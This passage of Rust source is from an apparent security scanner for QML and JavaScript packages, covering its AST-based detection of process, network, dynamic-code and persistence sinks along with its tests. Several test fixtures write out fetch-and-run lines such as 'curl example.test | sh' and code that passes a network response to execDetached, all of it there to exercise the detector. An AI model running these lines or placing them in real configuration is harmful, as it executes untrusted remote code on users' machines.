                                        DYNAMIC_REFERENCE_RULE,
                                        number_of(binding),
                                        format!(
                                            "dynamic-reference-sink:Loader.source:{}",
                                            node_text(source, unwrap_expression_statement(binding))
                                                .chars()
                                                .take(120)
                                                .collect::<String>()
                                        ),
                                        Confidence::AstBacked,
                                    ));
                                }
                            }
                        }
                    }
                }
                "call_expression" => {
                    handle_call_expression(source, node, &mut outcome, &mut flags);
                }
                "identifier" | "property_identifier" => {
                    let token_line = ast::number_of(node);
                    apply_surface_token(source, node, &mut outcome, token_line);
                }
                "string" => {
                    let content = string_literal_content(source, node);
                    if let Some(length) = encoded_literal_length(&content) {
                        outcome.result_parts.push(parts(
                            OBFUSCATION_RULE,
                            number_of(node),
                            format!("encoded-literal:{length}"),
                            Confidence::AstBacked,
                        ));
                    }
                }
                "new_expression" => {
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "Function"
                    {
                        // Runtime code construction via the Function
                        // constructor is equivalent to eval for review
                        // purposes.
                        outcome.result_parts.push(parts(
                            DYNAMIC_CODE_RULE,
                            number_of(node),
                            "dynamic-code-construction:new Function",
                            Confidence::AstBacked,
                        ));
                        outcome.capabilities.push(occurrence(
                            Capability::DynamicCodeExecution,
                            Language::Qml,
                            number_of(node),
                            "new Function",
                        ));
                    }
                    if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "XMLHttpRequest"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new XMLHttpRequest",
                        ));
                    } else if node.child_count() >= 2
                        && node_text(source, node.child(1).unwrap()) == "WebSocket"
                    {
                        flags.network.get_or_insert(number_of(node));
                        outcome.capabilities.push(occurrence(
                            Capability::NetworkAccess,
                            Language::Qml,
                            number_of(node),
                            "new WebSocket",
                        ));
                    }
                }
                _ => {}
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }

        // Literal references: path-shaped strings in reference positions.
        collect_ast_references(source, tree, &mut outcome.references);

        outcome
    }

    pub(super) fn number_of(node: tree_sitter::Node) -> u32 {
        node.start_position().row as u32 + 1
    }

    fn node_text<'a>(source: &'a str, node: tree_sitter::Node) -> &'a str {
        &source[node.start_byte()..node.end_byte()]
    }

    /// The object-definition type node: an identifier or a
    /// nested_identifier for qualified spellings (`QtQuick as QQ` ->
    /// `QQ.Loader`), which the grammar permits (H2 review).
    fn object_type_node<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
    ) -> Option<tree_sitter::Node<'a>> {
        let _ = source;
        let mut cursor = object.walk();
        object
            .children(&mut cursor)
            .find(|child| matches!(child.kind(), "identifier" | "nested_identifier"))
    }

    /// Terminal segment of a (possibly dotted) type spelling: `QQ.Loader`
    /// and `Loader` both resolve to the `Loader` sink type.
    fn terminal_segment(type_text: &str) -> &str {
        type_text.rsplit('.').next().unwrap_or(type_text)
    }

    fn handle_object_definition(source: &str, node: tree_sitter::Node, outcome: &mut FileOutcome) {
        let Some(type_node) = object_type_node(source, node) else {
            return;
        };
        let type_name = terminal_segment(node_text(source, type_node));

        match type_name {
            "Process" => {
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
                if let Some(binding_value) = binding_value(source, node, "command") {
                    evaluate_execution_value(source, binding_value, SinkKind::Process, outcome);
                    // Command argv is a verified sink position (H2): literal
                    // arguments outside the tree surface typed rejections;
                    // in-tree literals resolve as invocation edges.
                    handle_reference_sink_value(
                        source,
                        binding_value,
                        SinkPosition::ProcessCommand,
                        outcome,
                    );
                }
            }
            "FileView" => {
                outcome.capabilities.push(occurrence(
                    Capability::FilesystemAccess,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
                if let Some(path_value) = binding_value(source, node, "path") {
                    let unwrapped = unwrap_expression_statement(path_value);
                    match classify_value(source, path_value) {
                        Value::Static(text) => {
                            // Persistence locations: writing toward autostart
                            // or user-systemd units is a context finding.
                            if text.contains("autostart")
                                || text.contains("systemd/user")
                                || text.contains(".config/systemd")
                            {
                                outcome.result_parts.push(parts(
                                    PERSISTENCE_RULE,
                                    number_of(unwrapped),
                                    format!("persistence-location:{text}"),
                                    Confidence::AstBacked,
                                ));
                            }
                            // FileView.path is a verified sink position (H2):
                            // the path participates in reference resolution
                            // with typed rejections, never load-sink findings.
                            handle_reference_sink_value(
                                source,
                                path_value,
                                SinkPosition::FileViewPath,
                                outcome,
                            );
                        }
                        Value::Dynamic(_) => {
                            // Computed reference sink: explicit low-confidence
                            // finding per the S3 exit criterion.
                            outcome.result_parts.push(parts(
                                DYNAMIC_REFERENCE_RULE,
                                number_of(unwrapped),
                                format!(
                                    "dynamic-reference-sink:FileView.path:{}",
                                    node_text(source, unwrapped)
                                        .chars()
                                        .take(120)
                                        .collect::<String>()
                                ),
                                Confidence::AstBacked,
                            ));
                        }
                    }
                }
            }
            "Timer" => {
                outcome.capabilities.push(occurrence(
                    Capability::PersistenceScheduling,
                    Language::Qml,
                    number_of(type_node),
                    type_name,
                ));
            }
            _ => {}
        }
    }

    /// The value expression of `property: value` inside one object
    /// definition. Bindings sit one level down, in the initializer.
    fn binding_value<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        binding_value_named(source, object, property)
    }

    fn binding_value_named<'a>(
        source: &'a str,
        object: tree_sitter::Node<'a>,
        property: &str,
    ) -> Option<tree_sitter::Node<'a>> {
        let mut outer = object.walk();
        let initializer = object
            .children(&mut outer)
            .find(|child| child.kind() == "ui_object_initializer")?;
        let mut cursor = initializer.walk();
        for child in initializer.children(&mut cursor) {
            if child.kind() != "ui_binding" {
                continue;
            }
            let mut binding_cursor = child.walk();
            let parts: Vec<tree_sitter::Node> = child.children(&mut binding_cursor).collect();
            let Some(name_node) = parts.first() else {
                continue;
            };
            if node_text(source, *name_node) != property {
                continue;
            }
            // Skip the ':' and take the expression after it.
            return parts.iter().rev().find(|part| part.kind() != ":").copied();
        }
        None
    }

    /// Process argv elements at runtime-value granularity (H3 review):
    /// static-shaped elements contribute their text; computed elements
    /// contribute nothing — an unknown position is never guessed at, which
    /// leaves dynamic-head egress to the H4 dataflow slice.
    fn argv_elements(source: &str, value: tree_sitter::Node) -> Vec<String> {
        let inner = unwrap_expression_statement(value);
        match inner.kind() {
            "array" => {
                let mut cursor = inner.walk();
                inner
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .map(|child| match classify_value(source, child) {
                        Value::Static(text) => text,
                        Value::Dynamic(_) => String::new(),
                    })
                    .collect()
            }
            _ => match classify_value(source, inner) {
                Value::Static(text) => text.split_whitespace().map(str::to_owned).collect(),
                Value::Dynamic(_) => Vec::new(),
            },
        }
    }

    fn classify_value(source: &str, node: tree_sitter::Node) -> Value {
        let inner = unwrap_expression_statement(node);
        match inner.kind() {
            "string" => Value::Static(string_literal_content(source, inner)),
            "template_string" => {
                let mut cursor = inner.walk();
                let has_substitution = inner
                    .children(&mut cursor)
                    .any(|child| child.kind() == "template_substitution");
                if has_substitution {
                    Value::Dynamic("dynamic-command")
                } else {
                    Value::Static(template_plain_content(source, inner))
                }
            }
            "array" => {
                let mut elements = Vec::new();
                let mut cursor = inner.walk();
                for child in inner.children(&mut cursor) {
                    if matches!(child.kind(), "[" | "]" | "," | ";" | "\"" | "'") {
                        continue;
                    }
                    match classify_value(source, child) {
                        Value::Static(text) => elements.push(text),
                        Value::Dynamic(reason) => return Value::Dynamic(reason),
                    }
                }
                Value::Static(elements.join(" "))
            }
            _ => {
                // Provenance marker: does this expression read network
                // response data? Checked over the raw slice so any nesting
                // depth counts.
                let text = node_text(source, inner);
                if text.contains("responseText")
                    || text.contains(".response")
                    || text.contains(".text(")
                {
                    Value::Dynamic("network-response-executed")
                } else {
                    Value::Dynamic("dynamic-command")
                }
            }
        }
    }

    fn unwrap_expression_statement<'a>(node: tree_sitter::Node<'a>) -> tree_sitter::Node<'a> {
        let mut current = node;
        loop {
            let mut cursor = current.walk();
            let named: Vec<tree_sitter::Node> = current
                .children(&mut cursor)
                .filter(|child| child.is_named())
                .collect();
            match (current.kind(), named.as_slice()) {
                ("expression_statement" | "parenthesized_expression", [single]) => {
                    current = *single
                }
                _ => return current,
            }
        }
    }

    /// Runtime content of a string literal: fragments verbatim plus each
    /// escape_sequence node decoded individually, so classification sees
    /// what the engine evaluates (`"\x68ttps://…"` is an `https://` load,
    /// H2 review) without re-decoding literal backslashes a `\\` escape
    /// produced.
    fn string_literal_content(source: &str, string_node: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = string_node.walk();
        for child in string_node.children(&mut cursor) {
            match child.kind() {
                "string_fragment" => content.push_str(node_text(source, child)),
                "escape_sequence" => content.push_str(&decode_js_escapes(node_text(source, child))),
                _ => {}
            }
        }
        content
    }

    fn template_plain_content(source: &str, template: tree_sitter::Node) -> String {
        let mut content = String::new();
        let mut cursor = template.walk();
        for child in template.children(&mut cursor) {
            match child.kind() {
                "string_fragment" => content.push_str(node_text(source, child)),
                "escape_sequence" => content.push_str(&decode_js_escapes(node_text(source, child))),
                _ => {}
            }
        }
        content
    }

    /// Unwraps transparent `(…)` wrappers so a parenthesized receiver such as
    /// `(Qt).createComponent(...)` verifies as the same Qt-global call as
    /// `Qt.createComponent(...)`.
    fn unwrap_transparent_parens(mut node: tree_sitter::Node) -> tree_sitter::Node {
        while node.kind() == "parenthesized_expression" {
            match node.named_child(0) {
                Some(inner) => node = inner,
                None => break,
            }
        }
        node
    }

    fn handle_call_expression(
        source: &str,
        node: tree_sitter::Node,
        outcome: &mut FileOutcome,
        flags: &mut LexFlags,
    ) {
        let mut cursor = node.walk();
        let children: Vec<tree_sitter::Node> = node.children(&mut cursor).collect();
        let Some(callee) = children.first().copied() else {
            return;
        };
        let callee_name = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last).to_owned())
                    .unwrap_or_default()
            }
            "identifier" => node_text(source, callee).to_owned(),
            _ => String::new(),
        };
        // Qt-receiver verification (H2 review): `createComponent` and
        // `include` are Qt global APIs; a user-defined
        // `backend.createComponent(...)` must not carry Qt-specific rules.
        // `Qt.some.createComponent(...)` also fails verification (its
        // receiver is a member expression, not the Qt global).
        let qt_receiver = callee.kind() == "member_expression" && {
            let mut receiver_cursor = callee.walk();
            callee
                .children(&mut receiver_cursor)
                .next()
                .map(unwrap_transparent_parens)
                .is_some_and(|receiver| {
                    receiver.kind() == "identifier" && node_text(source, receiver) == "Qt"
                })
        };
        let is_qt_sink =
            qt_receiver && matches!(callee_name.as_str(), "createComponent" | "include");
        if matches!(callee_name.as_str(), "eval" | "createQmlObject" | "atob") || is_qt_sink {
            outcome.result_parts.push(parts(
                DYNAMIC_CODE_RULE,
                number_of(node),
                format!("dynamic-code-construction:{callee_name}"),
                Confidence::AstBacked,
            ));
            outcome.capabilities.push(occurrence(
                Capability::DynamicCodeExecution,
                Language::Qml,
                number_of(node),
                &callee_name,
            ));
        }
        // Qt.createComponent / Qt.include are also reference sinks (H2):
        // their first argument decides whether remote or out-of-tree content
        // is loaded, or which in-tree file the invocation edge points at.
        if is_qt_sink {
            let sink = if callee_name == "createComponent" {
                SinkPosition::CreateComponent
            } else {
                SinkPosition::Include
            };
            if let Some(arguments) = children.iter().find(|child| child.kind() == "arguments") {
                let mut args_cursor = arguments.walk();
                let args: Vec<tree_sitter::Node> = arguments
                    .children(&mut args_cursor)
                    .filter(|child| child.is_named())
                    .collect();
                if let Some(first) = args.first().copied() {
                    handle_reference_sink_value(source, first, sink, outcome);
                }
            }
        }
        let is_detached = match callee.kind() {
            "member_expression" => {
                let mut member_cursor = callee.walk();
                callee
                    .children(&mut member_cursor)
                    .last()
                    .map(|last| node_text(source, last) == "execDetached")
                    .unwrap_or(false)
            }
            "identifier" => node_text(source, callee) == "execDetached",
            _ => false,
        };
        if !is_detached {
            // fetch(...) / X.fetch(...): network capability.
            let fetch_call = match callee.kind() {
                "identifier" => node_text(source, callee) == "fetch",
                "member_expression" => {
                    let mut member_cursor = callee.walk();
                    callee
                        .children(&mut member_cursor)
                        .last()
                        .map(|last| node_text(source, last) == "fetch")
                        .unwrap_or(false)
                }
                _ => false,
            };
            if fetch_call {
                flags.network.get_or_insert(number_of(node));
                outcome.capabilities.push(occurrence(
                    Capability::NetworkAccess,
                    Language::Qml,
                    number_of(node),
                    "fetch()",
                ));
            }
            return;
        }
        flags.detached_any.get_or_insert(number_of(node));
        outcome.capabilities.push(occurrence(
            Capability::DetachedProcessExecution,
            Language::Qml,
            number_of(node),
            node_text(source, node)
                .chars()
                .take(200)
                .collect::<String>()
                .as_str(),
        ));
        // First argument after the callee's arguments '(' — reuse classification.
        if let Some(arguments) = children.iter().find(|child| child.kind() == "arguments") {
            let mut args_cursor = arguments.walk();
            let args: Vec<tree_sitter::Node> = arguments
                .children(&mut args_cursor)
                .filter(|child| child.is_named())
                .collect();
            if let Some(first) = args.first().copied() {
                evaluate_execution_value(source, first, SinkKind::DetachedExecution, outcome);
                // The executed path is also a reference sink (H2): a literal
                // outside the tree is a typed rejection, a literal inside it
                // resolves as an invocation edge.
                handle_reference_sink_value(source, first, SinkPosition::ExecDetached, outcome);
            }
        }
    }

    fn evaluate_execution_value(
        source: &str,
        value_node: tree_sitter::Node,
        kind: SinkKind,
        outcome: &mut FileOutcome,
    ) {
        let number = number_of(value_node);
        let rule_id = match kind {
            SinkKind::Process => PROCESS_RULE,
            SinkKind::DetachedExecution => DETACHED_RULE,
        };
        // Egress attribution (H3 review): only the executable position
        // attributes egress. See argv_head_fetches.
        if kind == SinkKind::Process {
            let elements = argv_elements(source, value_node);
            let borrowed: Vec<&str> = elements.iter().map(String::as_str).collect();
            let head = argv_head_fetches(&borrowed);
            if head.fetches {
                outcome.capabilities.push(occurrence(
                    Capability::NetworkAccess,
                    Language::Qml,
                    number,
                    "process-argv-fetch-tool",
                ));
            }
            if head.exhausted {
                disclose_budget_limitation(outcome);
            }
        }
        match classify_value(source, value_node) {
            Value::Static(text) => {
                if let Some(shell_offset) = find_shell_interpreter(&text) {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        format!(
                            "shell-interpreter-command:{}",
                            text.chars()
                                .skip(shell_offset)
                                .take(400)
                                .collect::<String>()
                        ),
                        Confidence::AstBacked,
                    ));
                }
            }
            Value::Dynamic(reason) => {
                let _ = kind;
                // A dynamic argument is only a finding when its visible
                // provenance is network response data; otherwise it stays a
                // capability observation (rule contract).
                if reason == "network-response-executed" {
                    outcome.result_parts.push(parts(
                        rule_id,
                        number,
                        reason,
                        Confidence::AstBacked,
                    ));
                }
            }
        }
    }

    /// Route a sink binding/call argument into reference handling (H2). Only
    /// static-shaped values participate: string literals, substitution-free
    /// template strings, and arrays of those. Fragments of computed
    /// expressions are not resolvable references and would misclassify, so
    /// they stay capability/finding material for the dataflow slice.
    fn handle_reference_sink_value(
        source: &str,
        value: tree_sitter::Node,
        sink: SinkPosition,
        outcome: &mut FileOutcome,
    ) {
        let inner = unwrap_expression_statement(value);
        match inner.kind() {
            "string" => record_sink_reference(
                &string_literal_content(source, inner),
                sink,
                number_of(inner),
                outcome,
            ),
            "template_string" => {
                let mut cursor = inner.walk();
                let substituted = inner
                    .children(&mut cursor)
                    .any(|child| child.kind() == "template_substitution");
                if !substituted {
                    record_sink_reference(
                        &template_plain_content(source, inner),
                        sink,
                        number_of(inner),
                        outcome,
                    );
                }
            }
            "array" => {
                let mut cursor = inner.walk();
                let children: Vec<tree_sitter::Node> = inner
                    .children(&mut cursor)
                    .filter(|child| child.is_named())
                    .collect();
                for child in children {
                    handle_reference_sink_value(source, child, sink, outcome);
                }
            }
            _ => {}
        }
    }

    fn collect_ast_references(
        source: &str,
        tree: &tree_sitter::Tree,
        references: &mut Vec<ReferenceCandidate>,
    ) {
        let mut stack = vec![tree.root_node()];
        while let Some(node) = stack.pop() {
            let text = match node.kind() {
                "string" => string_literal_content(source, node),
                "template_string" => template_plain_content(source, node),
                _ => String::new(),
            };
            if is_path_shaped(&text) {
                references.push(ReferenceCandidate {
                    line: number_of(node),
                    value: text,
                    sink: None,
                });
            }
            let mut cursor = node.walk();
            stack.extend(node.children(&mut cursor));
        }
    }
}

#[cfg(feature = "qml-parser")]
fn ast_scan_qml(source: &str, tree: &tree_sitter::Tree) -> FileOutcome {
    ast::scan(source, tree)
}

#[cfg(test)]
mod tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    #[expect(dead_code, reason = "used by the fallback-build test only")]
    fn one_file_inventory(relative: &str, kind: PayloadKind, size: usize) -> PayloadInventory {
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: relative.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        inventory
    }

    pub(crate) fn analyze_with(
        mut inventory: PayloadInventory,
        contents: &[(&str, &[u8])],
    ) -> (AnalysisArtifacts, PayloadInventory) {
        let lookup: std::collections::HashMap<&str, &[u8]> = contents
            .iter()
            .map(|(path, bytes)| (*path, *bytes))
            .collect();
        let artifacts = analyze_inventory(
            &mut inventory,
            &|entry| {
                lookup
                    .get(entry.relative_path.as_str())
                    .map(|bytes| bytes.to_vec())
            },
            &TimeBudget::default(),
        );
        (artifacts, inventory)
    }

    #[test]
    fn static_benign_process_is_capability_only() {
        let source = r#"
import Quickshell.Io
Process { command: ["notify-send", "hello"] }
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Main.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.results.is_empty(),
            "benign argv must not be a finding"
        );
        assert_eq!(
            inventory.entries[0].coverage_state,
            CoverageState::Analyzed,
            "capability observation counts as analysis output"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn shell_chain_argv_is_a_finding() {
        let source = "Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Evil.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1);
        assert_eq!(rendered[0].rule_id, PROCESS_RULE);
        assert_eq!(rendered[0].severity, "medium");
        assert!(
            rendered[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only() {
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        // A bare identifier has no visible suspicious provenance; the ability
        // is recorded, never a finding (rule contract).
        assert!(artifacts.rendered_findings().is_empty());
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
    }

    #[test]
    fn quoted_slashes_survive_but_comments_do_not() {
        // A quoted URL before a live command must not hide it, and a
        // commented-out call must never become a finding.
        let js_source = r#"var url = "https://example.test/a";
execDetached("echo ok"); // execDetached("sh -c curl evil | sh")
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comments.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(js_source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented chains are invisible; quoted URLs are inert: {:?}",
            artifacts.rendered_findings()
        );

        // Same line: a quoted URL must not hide a LIVE command binding that
        // follows it, even with a trailing comment after it.
        let js_same_line = "var u = \"https://example.test/a\"; Process { command: [\"sh\", \"-c\", \"curl evil | sh\"] } // tail\n";
        let mut same_line_inventory = PayloadInventory::default();
        same_line_inventory.entries.push(PayloadEntry {
            relative_path: "SameLine.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_same_line.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let same_line_artifacts = analyze_inventory(
            &mut same_line_inventory,
            &|_| Some(js_same_line.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let same_line_findings = same_line_artifacts.rendered_findings();
        assert_eq!(same_line_findings.len(), 1, "{same_line_findings:?}");
        assert!(
            same_line_findings[0]
                .evidence
                .starts_with("shell-interpreter-command:")
        );

        // Same shape as above, but the second call is LIVE: the finding
        // survives the earlier quoted URL and the trailing comment.
        let js_live = r#"var url = "https://example.test/a";
Process { command: "notify" }; execDetached(xhr.responseText) // note
"#;
        let mut live_inventory = PayloadInventory::default();
        live_inventory.entries.push(PayloadEntry {
            relative_path: "Live.js".to_owned(),
            kind: PayloadKind::JavaScript,
            mode: 0o644,
            size: js_live.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let live_artifacts = analyze_inventory(
            &mut live_inventory,
            &|_| Some(js_live.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = live_artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn later_suspicious_execdetached_on_one_line_is_not_masked() {
        // A benign first call must not suppress the suspicious second one,
        // even when they share a line inside a real handler body.
        let source = r#"Item {
    Component.onCompleted: {
        Quickshell.execDetached("echo ok"); Quickshell.execDetached(xhr.responseText)
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Mask.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 1, "{findings:?}");
        assert_eq!(findings[0].rule_id, DETACHED_RULE);
        assert_eq!(findings[0].evidence, "network-response-executed");
    }

    #[test]
    fn comments_never_feed_lexical_provenance() {
        let source = "Process { command: \"notify-send hi\" } // sh -c curl evil | sh\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Comment.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "commented-out chains are not provenance: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn dynamic_identifier_binding_is_capability_only_lexical_parity() {
        // Lexical builds additionally cannot even see the flow; both must
        // agree that a bare identifier is never a finding.
        let source = "Process { id: p; command: commandFromNetwork }\n";
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Dyn.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution")
        );
        assert!(artifacts.rendered_findings().is_empty());
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn network_response_reaching_execution_is_a_finding() {
        let source = r#"Item {
    Component.onCompleted: {
        var xhr = new XMLHttpRequest()
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
    }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Chain.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DETACHED_RULE);
        assert_eq!(rendered[0].evidence, "network-response-executed");
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn unrelated_network_and_execution_never_form_a_finding() {
        let source = r#"Item {
    Timer { onTriggered: statusText.text = "tick" }
    Process { command: ["notify-send", "done"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/api")
        xhr.send()
    } }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "Calm2.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        assert!(
            artifacts.rendered_findings().is_empty(),
            "co-occurrence without data flow must stay capability-only: {:?}",
            artifacts.rendered_findings()
        );
        let kinds: Vec<&str> = artifacts
            .capabilities
            .iter()
            .map(|capability| capability.capability.as_str())
            .collect();
        assert!(kinds.contains(&"network-access"));
        assert!(kinds.contains(&"process-execution"));
        // Capability records carry their covering-rule contract.
        for capability in &artifacts.capabilities {
            assert!(capability.source_rule_id.is_some(), "{capability:?}");
            assert!(!capability.explanation.is_empty());
            assert!(!capability.review_guidance.is_empty());
        }
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn computed_loader_source_is_an_explicit_low_confidence_finding() {
        let source = r#"Item {
    Loader { source: root.dynamicPath }
}
"#;
        let mut inventory = PayloadInventory::default();
        inventory.entries.push(PayloadEntry {
            relative_path: "DynRef.qml".to_owned(),
            kind: PayloadKind::Qml,
            mode: 0o644,
            size: source.len() as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        });
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &TimeBudget::default(),
        );
        let rendered = artifacts.rendered_findings();
        assert_eq!(rendered.len(), 1, "{rendered:?}");
        assert_eq!(rendered[0].rule_id, DYNAMIC_REFERENCE_RULE);
        assert_eq!(rendered[0].severity, "low");
        assert_eq!(rendered[0].confidence.as_deref(), Some("ast-backed"));
        assert!(
            rendered[0]
                .evidence
                .starts_with("dynamic-reference-sink:Loader.source")
        );
    }
}

#[cfg(test)]
mod integration_tests {
    use super::*;
    use omasafe_core::bounds::TimeBudget;
    use omasafe_report::Report;
    use omasafe_report::analysis::AnalysisSection;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    const EVIL_QML: &str = r#"
import QtQuick
import Quickshell.Io
Item {
    Process { command: ["sh", "-c", "curl example.test/p | sh"] }
    Text { text: {
        var xhr = new XMLHttpRequest()
        xhr.open("GET", "https://example.test/x")
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) Quickshell.execDetached(xhr.responseText)
        }
        xhr.send()
    } }
    Loader { source: "./Helper.qml" }
}
"#;

